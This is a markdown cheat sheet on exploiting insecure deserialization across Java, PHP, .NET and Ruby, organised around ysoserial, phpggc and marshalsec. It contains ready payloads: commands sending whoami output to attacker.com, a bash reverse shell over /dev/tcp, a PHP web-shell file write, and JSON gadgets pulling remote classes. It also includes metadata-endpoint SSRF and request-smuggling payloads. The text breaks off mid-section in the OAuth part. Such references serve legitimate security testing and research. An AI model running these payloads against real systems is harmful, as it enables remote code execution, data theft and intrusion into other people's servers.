# Insecure Deserialization — Master Knowledgebase
## Advanced Bug Bounty & Black-Box Testing Reference

> **Scope**: Java, PHP, .NET, Ruby deserialization | Gadget chains | RCE | SSRF | Request Smuggling | Cache Poisoning | OAuth | Browser quirks | Automation | Nuclei | WAF bypasses
> **Sources**: PortSwigger Labs & Research, ysoserial, ysoserial.net, PHPGGC, marshalsec, ProjectDiscovery, HackTricks, SecLists, Swissky/PayloadsAllTheThings, Frans Rosen, James Kettle research

---

## Table of Contents
1. [Basics](#basics)
2. [Insecure Deserialization Theory](#insecure-deserialization-theory)
3. [Object Serialization Internals](#object-serialization-internals)
4. [Java Gadget Chains](#java-gadget-chains)
5. [PHP Gadget Chains](#php-gadget-chains)
6. [.NET Gadget Chains](#net-gadget-chains)
7. [Ruby Deserialization Chains](#ruby-deserialization-chains)
8. [ysoserial Payloads](#ysoserial-payloads)
9. [phpggc Payloads](#phpggc-payloads)
10. [marshalsec Payloads](#marshalsec-payloads)
11. [Arbitrary Object Modification](#arbitrary-object-modification)
12. [Object Injection Attacks](#object-injection-attacks)
13. [RCE Gadget Chains](#rce-gadget-chains)
14. [SSRF + Deserialization Chains](#ssrf--deserialization-chains)
15. [Request Smuggling + Deserialization Chains](#request-smuggling--deserialization-chains)
16. [Cache Poisoning + Deserialization Chains](#cache-poisoning--deserialization-chains)
17. [OAuth + Deserialization Chains](#oauth--deserialization-chains)
18. [Parser Confusion Payloads](#parser-confusion-payloads)
19. [Browser Quirks](#browser-quirks)
20. [Gadget Chains](#gadget-chains)
21. [Real World Case Studies](#real-world-case-studies)
22. [Fuzzing Payloads](#fuzzing-payloads)
23. [Automation Workflows](#automation-workflows)
24. [Recon Methodology](#recon-methodology)
25. [Nuclei Templates](#nuclei-templates)
26. [Tools and Scanners](#tools-and-scanners)
27. [Advanced Research](#advanced-research)
28. [Bug Bounty Writeups](#bug-bounty-writeups)
29. [Payload Collections](#payload-collections)
30. [WAF Bypasses](#waf-bypasses)
31. [Detection Techniques](#detection-techniques)
32. [References](#references)

---

## Basics

### What is Serialization?
Serialization is the process of converting complex data structures (objects, arrays, memory state) into a format that can be stored or transmitted, then restored later. Common formats:

| Language | Format | Function | Dangerous?
|----------|--------|----------|-----------|
| Java | Binary (`AC ED 00 05` magic bytes) | `ObjectInputStream.readObject()` | Yes |
| PHP | Serialized string | `serialize()` / `unserialize()` | Yes |
| .NET | BinaryFormatter / LosFormatter / SoapFormatter | `BinaryFormatter.Deserialize()` | Yes |
| Ruby | Marshal | `Marshal.load()` / `Marshal.restore()` | Yes |
| Python | Pickle | `pickle.load()` | Yes |
| Node.js | `node-serialize` / `serialize-javascript` | `unserialize()` | Yes |
| Java | JSON + custom ObjectMapper | `readValue()` with default typing | Sometimes |
| PHP | PHAR metadata | `phar://` wrapper | Yes (meta-unserialize) |

### Why is it Dangerous?
When an application deserializes untrusted data, an attacker can craft malicious serialized objects that execute code during or after deserialization. The vulnerability is not in the deserialization API itself, but in the **gadgets** available in the application's classpath.

### Key Insight (PortSwigger)
> "Deserialization is not exploitation. Exploitation is the abuse of application functionality (gadgets) that happens to be reachable during deserialization."

---

## Insecure Deserialization Theory

### The Deserialization Attack Surface
1. **User-controlled input** reaches a deserialization function
2. **Type confusion**: The attacker can instantiate arbitrary classes
3. **Gadget availability**: The target classpath contains dangerous classes
4. **Chain execution**: A series of method calls (the "gadget chain") leads to RCE, SSRF, file write, etc.

### Attack Vectors by Language

#### Java
- `ObjectInputStream.readObject()`
- `XMLDecoder.readObject()`
- `XStream.fromXML()`
- `JSON` libraries with polymorphic type handling (Jackson, Fastjson)
- RMI/JNDI remote class loading
- JMX, RMI registry, CORBA

#### PHP
- `unserialize()` on user input
- `phar://` wrapper triggering metadata deserialization
- `Session` deserialization (handler mismatch)
- `__wakeup()`, `__destruct()`, `__toString()` as gadget entry points
- POP (Property-Oriented Programming) chains

#### .NET
- `BinaryFormatter.Deserialize()`
- `LosFormatter.Deserialize()`
- `SoapFormatter.Deserialize()`
- `DataContractSerializer` with `ReadObject()`
- `JavaScriptSerializer` with type discriminators
- `Json.NET` with `TypeNameHandling.All`

#### Ruby
- `Marshal.load()` / `Marshal.restore()`
- `YAML.load()` (psych engine — safe vs unsafe)
- `OX.load()` with `:object` mode
- `JSON.parse` with `Oj` gem in object mode

---

## Object Serialization Internals

### Java Serialization Format (Binary)
Magic bytes: `AC ED 00 05` (hex) — `rO0AB` (Base64)

Structure:
```
STREAM_MAGIC (2 bytes) = 0xACED
STREAM_VERSION (2 bytes) = 0x0005
Contents:
  TC_OBJECT (0x73)
  classDesc
  newHandle
  classData[]
```

**Base64 Detection**: Strings starting with `rO0AB` are almost certainly Java serialized objects.

**Hex Detection**: Look for `AC ED 00 05` at the start of a binary body.

### PHP Serialization Format
```
N; — null
b:1; — boolean true
i:123; — integer
s:4:"test"; — string (length:value)
a:2:{i:0;s:4:"test";i:1;i:123;} — array
O:8:"stdClass":1:{s:4:"name";s:4:"test";} — object
```

**Key behavior**: PHP references (`R:2;`) allow cyclic structures. Object properties can be set to arbitrary values including other objects.

**PHAR format**: A PHAR file contains serialized metadata. When any file operation (`file_exists()`, `fopen()`, `file_get_contents()`, `unlink()`, `md5_file()`, etc.) is performed on a `phar://` URL, the PHAR's metadata is automatically deserialized.

```php
// Triggers unserialize of phar metadata
file_exists('phar:///uploads/image.phar/test.txt');
```

### .NET Serialization Format
BinaryFormatter produces binary output with type information embedded. LosFormatter produces URL-safe Base64 strings often seen in `__VIEWSTATE`.

LosFormatter detection:
- Long Base64 strings in `__VIEWSTATE` parameter
- Often starts with `/wE` or similar patterns
- Decodes to binary with type names visible in strings

### Ruby Marshal Format
Magic bytes: `\x04\x08` (marshal version 4.8)
Structure includes type bytes:
- `0x22` (`"`) — string
- `0x6F` (`o`) — object
- `0x55` (`U`) — class
- `0x3A` (`:`) — symbol

---

## Java Gadget Chains

### CommonsCollections (CC) — The Classic
**Affected versions**: CommonsCollections <= 3.2.1 and 4.0
**Root cause**: `Transformer` interface allows arbitrary object transformation chains.

#### CommonsCollections1 (CC1)
Chain overview:
```
ObjectInputStream.readObject()
  AnnotationInvocationHandler.readObject()
    MapEntry.setValue()
      TransformedMap.checkSetValue()
        ChainedTransformer.transform()
          ConstantTransformer.transform()
          InvokerTransformer.transform()
            Method.invoke()
              Runtime.exec()
```

**Payload structure**:
1. Create `ChainedTransformer` with:
   - `ConstantTransformer(Runtime.class)`
   - `InvokerTransformer("getMethod", ...)`
   - `InvokerTransformer("invoke", ...)`
   - `InvokerTransformer("exec", new String[]{"calc.exe"})`
2. Wrap in `TransformedMap.decorate()`
3. Use `AnnotationInvocationHandler` (proxy for `Map`) to trigger `setValue()` on deserialization

#### CommonsCollections2 (CC2)
Uses `PriorityQueue` + `TransformingComparator` + `InvokerTransformer`.
Avoids `AnnotationInvocationHandler` (Java 8u71+ patch bypass).

```
PriorityQueue.readObject()
  TransformingComparator.compare()
    InvokerTransformer.transform()
      TemplatesImpl.newTransformer()
        ... bytecode execution via defineClass()
```

#### CommonsCollections3 (CC3)
Uses `InstantiateTransformer` + `TrAXFilter` + `TemplatesImpl`.
Bypasses `InvokerTransformer` blacklists by using `TrAXFilter` constructor to call `TemplatesImpl.newTransformer()`.

#### CommonsCollections4 (CC4)
Similar to CC2 but uses `InstantiateTransformer` instead of direct `InvokerTransformer`.

#### CommonsCollections5 (CC5)
Uses `TiedMapEntry` + `LazyMap` + `BadAttributeValueExpException`.
Bypasses `AnnotationInvocationHandler` patch via `BadAttributeValueExpException.readObject()`.

```
BadAttributeValueExpException.readObject()
  TiedMapEntry.toString()
    LazyMap.get()
      ChainedTransformer.transform()
```

#### CommonsCollections6 (CC6)
Uses `TiedMapEntry` + `HashMap` + `LazyMap`.
Works when `AnnotationInvocationHandler` is unavailable or patched.

```
HashMap.readObject()
  HashMap.hash()
    TiedMapEntry.hashCode()
      TiedMapEntry.getValue()
        LazyMap.get()
          ChainedTransformer.transform()
```

#### CommonsCollections7 (CC7)
Uses `Hashtable` + `LazyMap` with collision handling.

### Spring Framework Gadgets
#### Spring1
Uses `SerializableTypeWrapper.MethodInvokeTypeProvider` + `ReflectionUtils`.

```
MethodInvokeTypeProvider.readObject()
  ReflectionUtils.findMethod()
    Method.invoke()
```

#### Spring2
Uses `JndiLocatorDelegate` + `InitialContext.lookup()` for JNDI injection.

### Hibernate Gadgets
- `BasicPropertyAccessor$BasicSetter` — property setter invocation
- `ComponentType` — composite type instantiation

### JBoss / Jenkins / WebLogic Specific
- `org.jboss.invocation.MarshalledValue` — wraps serialized objects
- Jenkins CLI: `Channel` deserialization with remoting capabilities
- WebLogic T3 protocol: proprietary serialization with known gadget chains

### Fastjson / Jackson Gadgets
These are JSON-based but rely on deserialization of type information.

#### Fastjson (<= 1.2.24)
```json
{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://attacker.com/Evil",
  "autoCommit": true
}
```

#### Jackson (with `defaultTyping` or `@class` polymorphism)
```json
{
  "id": 1,
  "obj": ["org.springframework.context.support.FileSystemXmlApplicationContext", "http://attacker.com/spel.xml"]
}
```

### JNDI Injection via Deserialization
JNDI lookup during deserialization is a common pattern:
- `InitialContext.lookup("ldap://attacker.com/Evil")`
- `RegistryContext.lookup()`
- `BeanFactory` + `ELProcessor` (Tomcat)

### RMI Registry Attacks
Java RMI uses native serialization. Binding/rebinding to RMI registry with malicious objects can trigger client-side deserialization when clients lookup objects.

---

## PHP Gadget Chains

### POP (Property-Oriented Programming) Chain Theory
PHP gadget chains rely on magic methods triggered during/after unserialization:
- `__wakeup()` — called immediately after unserialize
- `__destruct()` — called when object is destroyed
- `__toString()` — called when object used as string
- `__call()` — called on undefined method
- `__get()` / `__set()` — property access
- `__invoke()` — called when object used as function
- `__unserialize()` — PHP 7.4+, replaces `__wakeup()`

### Laravel / Symfony Chains (PHPGGC)

#### Laravel/RCE1 (5.4.27, 5.5.40, 5.6.29)
```
Illuminate\Broadcasting\PendingBroadcast.__destruct()
  Illuminate\Events\Dispatcher.dispatch()
    Faker\Generator.format()
      call_user_func_array('system', ['id'])
```

#### Laravel/RCE2 (5.5.39, 5.6.28)
Uses `PendingBroadcast` + `Dispatcher` + `EvalLoader`.

#### Laravel/RCE3 (5.5.0 - 5.8.17)
```
Illuminate\Queue\CallQueuedHandler@call()
  Illuminate\Queue\Jobs\Job@resolve()
    unserialize($job)
```

#### Laravel/RCE4 (5.4.0+)
Uses `PendingBroadcast` + `BroadcastEvent` + `__destruct` chain through `Symfony\Component\Process\Process`.

#### Laravel/RCE5 (5.8.0+)
Uses `Illuminate\Database\Connection` + `__call` to `PDO::exec()`.

#### Laravel/RCE6 (8.x)
Uses `Illuminate\Broadcasting\PendingBroadcast` + `Illuminate\Bus\Dispatcher` + `Illuminate\Container\Container`.

#### Laravel/RCE7 (8.x)
Uses `Illuminate\Queue\Capsule\Manager` + `Illuminate\Queue\Worker`.

#### Symfony/RCE1 (3.3, 3.4, 4.2, 4.4)
Uses `Symfony\Component\Cache\Adapter\TagAwareAdapter` + `Symfony\Component\Cache\CacheItem`.

#### Symfony/RCE2 (4.3)
Uses `Symfony\Component\Process\Process` + `Symfony\Component\Process\Pipes\AbstractPipes`.

#### Symfony/RCE3 (3.4)
Uses `Symfony\Component\String\LazyString` + `__toString()`.

#### Symfony/RCE4 (5.2)
Uses `Symfony\Component\Cache\Adapter\PhpFilesAdapter` + `require_once` gadget.

### Monolog Gadgets
Monolog is widely used and provides excellent gadgets:

#### Monolog/RCE1
```
Monolog\\Handler\\SyslogUdpHandler.__destruct()
  Monolog\\Handler\\BufferHandler.close()
    Monolog\\Handler\\NativeMailerHandler.send()
      call_user_func('system', 'id')
```

#### Monolog/RCE2
Uses `Monolog\Handler\GroupHandler` + `FingersCrossedHandler`.

#### Monolog/RCE3 (1.x, 2.x)
Uses `Monolog\Handler\NativeMailerHandler` + `Monolog\Handler\SyslogUdpHandler`.

### Guzzle Gadgets
`GuzzleHttp\Cookie\FileCookieJar` — `__destruct()` calls `save()` on user-controlled filename with user-controlled data (file write primitive).

### Doctrine / Zend / Slim Gadgets
- Doctrine: `ArrayCollection` + `__toString()` chains
- Zend: `Zend\Cache\Storage\Plugin\PluginInterface` chains
- Slim: `Slim\Http\Cookies` + `set()` chains

### WordPress / Drupal / Magento Specific
- WordPress: `WP_Theme` + `__toString()`
- Drupal: `Guzzle` + `Batch` chains
- Magento: `Zend\Http\Response` + `__toString()`

---

## .NET Gadget Chains

### ysoserial.net Chains

#### TypeConfuseDelegate (LosFormatter / BinaryFormatter)
Uses `ComparisonComparer` + `MulticastDelegate` + `Func` to achieve arbitrary method invocation.

```
ObjectDataProvider.SetObject()
  MethodInvoker.Invoke()
```

#### TextFormattingRunProperties (ViewState)
Uses `System.Windows.Media` + `XamlReader.Parse()` to deserialize XAML that contains system commands.

```
TextFormattingRunProperties..ctor(string xmlAttributes)
  XamlReader.Parse(xmlAttributes)  // executes ObjectDataProvider
```

#### PSObject (PowerShell)
Uses `System.Management.Automation.PSObject` + `TypeTable` to execute PowerShell commands.

#### ObjectDataProvider
Direct gadget for arbitrary method invocation:
```csharp
ObjectDataProvider odp = new ObjectDataProvider();
odp.ObjectInstance = new System.Diagnostics.Process();
odp.MethodName = "Start";
odp.MethodParameters.Add("cmd.exe");
odp.MethodParameters.Add("/c calc");
```

#### RolePrincipal + WindowsIdentity
For ASP.NET ViewState exploitation with known machine keys.

#### SessionSecurityToken
For JWT/Session token deserialization in WIF.

### .NET JSON Gadgets
#### Json.NET (Newtonsoft.Json)
With `TypeNameHandling.All`:
```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System"
  },
  "MethodParameters": {
    "$type": "System.Object[], mscorlib",
    "$values": ["cmd", "/c calc.exe"]
  }
}
```

#### JavaScriptSerializer
With `SimpleTypeResolver` or custom type resolver:
```json
{"__type":"System.CodeDom.Compiler.TempFileCollection","TempDir":"C:/Windows/Temp","KeepFiles":true}
```

### ViewState Exploitation
Requires `machineKey` (validationKey + decryptionKey) for ASP.NET <= 4.0.
For ASP.NET 4.5+ with `EnableViewStateMac=false` and `ViewStateEncryptionMode="Never"`.

---

## Ruby Deserialization Chains

### Marshal.load() Chains
Ruby Marshal is extremely powerful — it can instantiate arbitrary classes and set instance variables directly, bypassing constructors.

#### Universal RCE Chain (Ruby 2.x - 3.x)
Uses `Gem::Requirement` + `Gem::Version` + `Enumerator::Lazy`:
```ruby
# Conceptual chain
Gem::Requirement#yaml_initialize
  Gem::Requirement#parse
    Gem::Version#initialize
      ... chain to arbitrary method execution
```

#### ERB / Template Injection
```ruby
code = 'Kernel.fork{ exec("/bin/sh") }'
# Crafted Marshal payload targeting ERB.new(code).result
```

#### ActiveSupport / Rails Chains
Rails uses Marshal for session storage by default (cookie store).

**Rails session cookie chain**:
```ruby
# app.secret_key_base must be known to sign cookie
# But if secret is weak/leaked, craft:
Marshal.load(Base64.decode64(cookie_value))
```

Chain through `ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy`:
```ruby
ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy
  -> @instance.__send__(@method, *args)
```

#### Sidekiq / DelayedJob
Background job processors that deserialize job arguments from Redis/DB.

### YAML.load() Chains (Psych)
Ruby YAML can instantiate arbitrary objects if `Psych.load` is used instead of `Psych.safe_load`.

```yaml
--- !ruby/object:Gem::Requirement
requirements:
  - !ruby/object:Gem::Dependency
    name: "|/bin/sh"
```

---

## ysoserial Payloads

### Usage Patterns
```bash
# Java CommonsCollections1
java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/?a=$(whoami)'

# Java CommonsCollections2 (for newer Java versions)
java -jar ysoserial.jar CommonsCollections2 'touch /tmp/pwned'

# Spring1
java -jar ysoserial.jar Spring1 'nslookup attacker.com'

# Hibernate1
java -jar ysoserial.jar Hibernate1 'id'

# URLDNS (no RCE, just DNS lookup — for detection)
java -jar ysoserial.jar URLDNS http://burp-collaborator.net

# JRMPListener / JRMPClient (for RMI tunneling)
java -jar ysoserial.jar JRMPListener 1099 CommonsCollections1 'calc.exe'
```

### Payload Classification
| Payload | Gadget | Java Versions | Notes |
|---------|--------|---------------|-------|
| `CommonsCollections1` | `AnnotationInvocationHandler` + `TransformedMap` | <= 8u71 | Classic, patched in 8u71 |
| `CommonsCollections2` | `PriorityQueue` + `TransformingComparator` + `TemplatesImpl` | All | Requires javassist |
| `CommonsCollections3` | `InstantiateTransformer` + `TrAXFilter` + `TemplatesImpl` | All | Bypasses `InvokerTransformer` blacklist |
| `CommonsCollections4` | `PriorityQueue` + `TransformingComparator` + `InstantiateTransformer` | All | Hybrid |
| `CommonsCollections5` | `BadAttributeValueExpException` + `TiedMapEntry` + `LazyMap` | <= 8u76 | Bypasses 8u71 patch |
| `CommonsCollections6` | `HashMap` + `TiedMapEntry` + `LazyMap` | All | Most compatible CC chain |
| `CommonsCollections7` | `Hashtable` + `LazyMap` | All | Alternative to CC6 |
| `Spring1` | `SerializableTypeWrapper` | All | Spring Framework |
| `Spring2` | `JndiLocatorDelegate` | All | JNDI lookup |
| `Hibernate1` | `BasicPropertyAccessor` | All | Hibernate |
| `Hibernate2` | `ComponentType` | All | Hibernate |
| `Jdk7u21` | `TemplatesImpl` + `LinkedHashSet` | <= 7u21 | Pure JDK |
| `JRE8u20` | `TemplatesImpl` + `LinkedHashSet` | <= 8u20 | Pure JDK |
| `URLDNS` | `HashMap` + `URL` | All | DNS-based detection only |
| `JRMPClient` | `RMI` | All | Connects to JRMP listener |
| `JRMPListener` | `RMI` | All | Accepts JRMP connections |
| `BeanShell1` | `BeanShell` | All | Requires bsh jar |
| `Clojure` | `Clojure` | All | Requires clojure jar |
| `Groovy1` | `Groovy` | All | Requires groovy jar |
| `JavassistWeld1` | `Javassist` + `Weld` | All | JBoss/Weld |
| `Jython1` | `Jython` | All | Requires jython jar |
| `MozillaRhino1` | `Rhino` | All | Mozilla Rhino JS engine |
| `MozillaRhino2` | `Rhino` + `Context` | All | Alternative Rhino |
| `Myfaces1` | `MyFaces` | All | Apache MyFaces |
| `Myfaces2` | `MyFaces` + `EL` | All | MyFaces EL |
| `ROME` | `ROME` | All | ROME RSS library |
| `Wicket1` | `Wicket` | All | Apache Wicket |
| `Vaadin1` | `Vaadin` | All | Vaadin Framework |

### Custom ysoserial Payloads
For custom gadget chains, extend `ysoserial.payloads.ObjectPayload`:
```java
public class CustomPayload implements ObjectPayload<Object> {
    public Object getObject(String command) throws Exception {
        // Build your gadget chain here
        return chain;
    }
}
```

---

## phpggc Payloads

### Installation & Usage
```bash
git clone https://github.com/ambionics/phpggc
cd phpggc
php phpggc --list

# Generate Laravel RCE payload
php phpggc Laravel/RCE1 system 'id'

# Generate Symfony file write
php phpggc Symfony/FW1 /var/www/html/shell.php '<?php system($_GET[1]);?>'

# Generate Monolog chain
php phpggc Monolog/RCE1 'bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"'

# Base64 encode for cookies/headers
php phpggc -b Laravel/RCE1 system 'id'

# URL encode
php phpggc -u Laravel/RCE1 system 'id'

# PHAR generation (for phar:// wrapper attacks)
php phpggc -p phar Laravel/RCE1 system 'id' -o payload.phar
```

### Available Chains (Selection)
| Framework | Chain | Type | Versions |
|-----------|-------|------|----------|
| Laravel | RCE1 | RCE | 5.4.27, 5.5.40, 5.6.29 |
| Laravel | RCE2 | RCE | 5.5.39, 5.6.28 |
| Laravel | RCE3 | RCE | 5.5.0 - 5.8.17 |
| Laravel | RCE4 | RCE | 5.4.0+ |
| Laravel | RCE5 | RCE | 5.8.0+ |
| Laravel | RCE6 | RCE | 8.x |
| Laravel | RCE7 | RCE | 8.x |
| Symfony | RCE1 | RCE | 3.3, 3.4, 4.2, 4.4 |
| Symfony | RCE2 | RCE | 4.3 |
| Symfony | RCE3 | RCE | 3.4 |
| Symfony | RCE4 | RCE | 5.2 |
| Symfony | FW1 | File Write | 2.x-4.x |
| Symfony | FD1 | File Delete | 2.x-4.x |
| Monolog | RCE1 | RCE | 1.x, 2.x |
| Monolog | RCE2 | RCE | 1.x, 2.x |
| Monolog | RCE3 | RCE | 1.x, 2.x |
| Guzzle | FW1 | File Write | 4.x-6.x |
| Guzzle | INFO1 | Info leak | 4.x-6.x |
| Doctrine | RCE1 | RCE | 2.x |
| Zend | RCE1 | RCE | 2.x |
| Slim | RCE1 | RCE | 3.x |
| TCPDF | RCE1 | RCE | 6.x |
| WordPress | RCE1 | RCE | Various plugins |

### PHAR Wrapper Attacks with PHPGGC
```bash
# Generate PHAR
php phpggc -p phar -o /var/www/html/upload/shell.phar Laravel/RCE1 system 'id'

# Trigger via any file function
# Target: file_exists('phar:///var/www/html/upload/shell.phar/x')
# file_exists, fopen, file_get_contents, file, md5_file, sha1_file, 
# unlink, copy, is_dir, is_file, is_link, is_executable, is_readable,
# is_writable, fileperms, filesize, filemtime, fileatime, filectime,
# fileinode, filegroup, fileowner, filetype, stat, lstat, readfile,
# highlight_file, show_source, parse_ini_file, simplexml_load_file,
# getimagesize, getimagesizefromstring, exif_read_data, exif_thumbnail,
# imagecreatefromjpeg, imagecreatefrompng, imagecreatefromgif, etc.
```

**Critical**: The file does NOT need to have `.phar` extension. Any file with a valid PHAR stub (`__HALT_COMPILER(); ?>`) will work.

---

## marshalsec Payloads

### JNDI Injection Payloads
marshalsec is primarily for generating JNDI/LDAP reference payloads for Java deserialization.

```bash
# Start LDAP server pointing to remote codebase
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com/#EvilClass 1389

# Start RMI server
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer http://attacker.com/#EvilClass 1099
```

### Payload Types
| Type | Usage |
|------|-------|
| `LDAPRefServer` | Serves LDAP references to remote classes |
| `RMIRefServer` | Serves RMI references to remote classes |
| `JRMPListener` | JRMP listener for ysoserial integration |
| `JNDIRefServer` | Generic JNDI reference server |

### Integration with ysoserial
```bash
# Start JRMP listener that serves CommonsCollections1
java -cp marshalsec.jar marshalsec.jndi.JRMPRefServer CommonsCollections1 'calc.exe' 1099

# Target application connects to JRMP and receives the gadget
```

### JNDI + Deserialization Chain (Modern Java)
For Java with trustURLCodebase=false (8u191+, 11.0.1+, 17+), use:
- **LDAP Serialized Data**: Return serialized gadget in LDAP `javaSerializedData` attribute
- **Local Factory**: Use classes already on target classpath (e.g., `BeanFactory` + `ELProcessor` in Tomcat)

```java
// LDAP entry with javaSerializedData
Attributes attrs = new BasicAttributes();
attrs.put("javaClassName", "foo");
attrs.put("javaSerializedData", ysoserialPayload);
```

---

## Arbitrary Object Modification

### Theory (PortSwigger Lab: Modifying Object Attributes)
When an application deserializes user-controlled data but implements some security checks on the resulting object, attackers can:
1. Deserialize legitimate object
2. Modify protected/private attributes
3. Reserialize and submit

**PHP Example**:
```php
// Original
O:4:"User":2:{s:8:"username";s:5:"admin";s:7:"isAdmin";b:0;}

// Modified
O:4:"User":2:{s:8:"username";s:5:"admin";s:7:"isAdmin";b:1;}
```

**Java Example**:
Use `java.io.ObjectOutputStream` to modify private fields, or use reflection-based gadgets to alter object state after deserialization but before security checks.

### Bypassing Type Constraints
If the application checks `instanceof` or class type after deserialization:
- Use proxy classes (`java.lang.reflect.Proxy`) that implement the expected interface
- Use subclasses that pass `instanceof` checks but override behavior
- PHP: Use `__PHP_Incomplete_Class` or namespace tricks

---

## Object Injection Attacks

### PHP Object Injection
Any call to `unserialize()` on user input is potentially vulnerable.

**Entry Points**:
- Direct `$_GET['data']`, `$_POST['data']`, `$_COOKIE['data']`
- Session data: `session_decode()`, custom session handlers
- Cache data: Memcached/Redis values deserialized
- API responses: REST/GraphQL fields deserialized internally
- PHAR metadata: Any file operation on `phar://` path

**Magic Method Entry Points**:
```php
// __wakeup is called immediately
class Evil {
    function __wakeup() {
        // Runs as soon as unserialize() completes
        file_put_contents('/tmp/shell.php', '<?php eval($_GET[1]);?>');
    }
}
```

### Session Deserialization Mismatch
When PHP `session.serialize_handler` differs between storage and retrieval:
```ini
; Attacker sets: php_serialize
session.serialize_handler = php_serialize
; Server expects: php
session.serialize_handler = php
```

Attacker injects serialized object into session storage that gets deserialized with `php` handler, triggering `unserialize()`.

### Java Object Injection
- RMI registry accepts serialized objects
- JMX MBean server accepts serialized objects
- JNDI lookup returns serialized objects
- HTTP session replication (WebLogic, WebSphere) deserializes cluster session data

---

## RCE Gadget Chains

### Java RCE Chains Summary
| Chain | Prerequisites | Reliability | Notes |
|-------|--------------|-------------|-------|
| CC1 | CommonsCollections <= 3.2.1 | High | Patched in 8u71 |
| CC2 | CommonsCollections4 + javassist | High | No AnnotationInvocationHandler |
| CC3 | CommonsCollections + TemplatesImpl | High | Bypasses InvokerTransformer blacklist |
| CC6 | CommonsCollections <= 3.2.1 | Very High | Works on all Java versions |
| Jdk7u21 | None (pure JDK) | Medium | Requires 7u21 or earlier |
| URLDNS | None | Detection only | No RCE, just DNS |
| Spring1 | Spring Framework | High | Uses MethodInvokeTypeProvider |
| Hibernate1 | Hibernate | High | Uses BasicPropertyAccessor |

### PHP RCE Chains Summary
| Chain | Prerequisites | Entry Point |
|-------|--------------|-------------|
| Laravel/RCE1 | Laravel + Faker | `PendingBroadcast.__destruct()` |
| Laravel/RCE4 | Laravel + Symfony Process | `PendingBroadcast.__destruct()` |
| Monolog/RCE1 | Monolog | `SyslogUdpHandler.__destruct()` |
| Symfony/RCE1 | Symfony + Cache | `TagAwareAdapter.__destruct()` |
| Guzzle/FW1 | Guzzle | `FileCookieJar.__destruct()` (file write) |

### .NET RCE Chains Summary
| Chain | Prerequisites | Entry Point |
|-------|--------------|-------------|
| TypeConfuseDelegate | BinaryFormatter/LosFormatter | `ComparisonComparer` |
| TextFormattingRunProperties | ViewState + XAML | `XamlReader.Parse()` |
| ObjectDataProvider | Any formatter | `MethodInvoker` |
| PSObject | PowerShell available | `TypeTable` |

---

## SSRF + Deserialization Chains

### Java SSRF via Deserialization
Many Java classes trigger network connections during deserialization or gadget execution:

#### URLDNS (Detection)
```java
// Simplest SSRF gadget — just triggers DNS lookup
HashMap ht = new HashMap();
URL u = new URL("http://attacker.com/");
ht.put(u, "data");
```
The `URL` class's `hashCode()` method triggers DNS resolution when the `HashMap` is deserialized and rehashed.

#### JNDI SSRF
```java
// Forces LDAP/RMI connection to attacker server
InitialContext.lookup("ldap://attacker.com:1389/Evil");
```

#### ImageIO / DocumentBuilder SSRF
```java
// javax.imageio.ImageIO.read(URL) during gadget chain
ImageIO.read(new URL("http://internal.service/secret"));
```

#### RMI Registry SSRF
Binding to RMI registry can force connected clients to deserialize attacker-controlled objects, causing them to make outbound connections.

### PHP SSRF via Deserialization
#### cURL/Guzzle chains
```php
// GuzzleHttp\Client inside deserialized object triggers request
$client = new GuzzleHttp\Client();
$client->get('http://169.254.169.254/latest/meta-data/');
```

#### SoapClient SSRF
PHP's `SoapClient` can be deserialized to trigger HTTP requests:
```php
$client = new SoapClient(null, [
    'location' => 'http://169.254.169.254/',
    'uri' => 'http://test/'
]);
$client->__soapCall("test", []);
```

### Ruby SSRF via Deserialization
Using `Net::HTTP`, `OpenURI`, or `RestClient` inside `Marshal.load()` chains to force HTTP requests to internal services.

---

## Request Smuggling + Deserialization Chains

### Theory (PortSwigger Research: HTTP Desync Attacks)
HTTP Request Smuggling (HRS) can be combined with deserialization to:
1. Smuggle a request that contains a malicious serialized payload
2. Bypass front-end security controls (WAF, authentication)
3. Hit back-end endpoints that deserialize the body

#### CL.TE Desync + Deserialization
```http
POST /vulnerable-endpoint HTTP/1.1
Host: target.com
Content-Length: 256
Transfer-Encoding: chunked

0

POST /admin/deserialize HTTP/1.1
Host: target.com
Content-Length: 500
Cookie: session=rO0ABXNyABFqYXZhLnV0... (ysoserial payload)

x=
```

#### TE.CL Desync + Deserialization
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /admin HTTP/1.1
X-Ignore: X

0

```

### Practical Scenarios
1. **Front-end WAF** inspects first request (legitimate), back-end receives smuggled request with serialized payload to `/api/internal/deserialize`
2. **Authentication bypass**: Smuggle past auth middleware to hit deserialization endpoint that trusts internal requests
3. **Cache poisoning**: Smuggle a request that stores a malicious serialized object in cache, later deserialized by other users

### Tools
- `http-request-smuggler` (Burp extension)
- `smuggler` (defparam)
- `param-miner` (Burp extension — for finding hidden desync parameters)

---

## Cache Poisoning + Deserialization Chains

### Theory (PortSwigger Research: Web Cache Entanglement & Practical Web Cache Poisoning)
Web cache poisoning can store malicious serialized objects that are later deserialized by other users.

#### Cache Poisoning via Deserialization Trigger
1. Find an unkeyed input (header, parameter) that gets deserialized
2. Poison the cache with a request containing `X-Forwarded-Host: attacker.com` and serialized payload
3. Other users receive the cached response containing the poisoned object

#### Deserialization via Cache Key
If the cache key includes a serialized object parameter:
```http
GET /api/data?obj=rO0ABXNy... HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```

Cache stores response for key `target.com/api/data?obj=<payload>`. When internal service deserializes `obj`, gadget chain executes.

#### Fat GET / POST Conversion
Some caches treat GET and POST differently. Convert a GET with query parameters to POST with body to bypass cache and hit deserialization endpoint:
```http
POST /api/process HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

serialized=rO0ABXNy...
```

### Browser-Powered Desync (James Kettle Research)
Use browser behaviors to cause desync:
- `Content-Length` + `Transfer-Encoding` parsing differences
- Chunked encoding with chunk extensions
- Request line parsing differences

---

## OAuth + Deserialization Chains

### Theory (PortSwigger Research: Hidden OAuth Attack Vectors)
OAuth flows often pass serialized state objects that can be attacked:

#### State Parameter Deserialization
```http
